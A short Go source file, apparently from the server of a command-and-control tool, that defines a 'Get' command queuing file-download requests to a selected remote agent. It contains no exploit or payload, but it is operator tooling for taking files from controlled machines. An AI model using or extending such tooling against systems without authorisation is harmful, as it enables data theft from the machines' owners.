package commands

import (
	"d3c/server/helpers"
	"global"
	globalhelpers "helpers"
	"log"
)

type Get struct {
	Command string
}

func (instance Get) Exec() (response string, err error) {
	separatedCommand := globalhelpers.CommandsSplit(instance.Command)

	if len(separatedCommand) > 1 && helpers.SelectedAgent != "" {
		commandSend := &global.Command{}
		commandSend.Request = instance.Command

		helpers.AddCommandToAgent(*commandSend, helpers.SelectedAgent)
		response = "Download command sent to agent: " + separatedCommand[1]
	} else {
		response = "Specify the file to be download!"
		log.Println("Specify the file to be download!")
	}

	return response, err
}
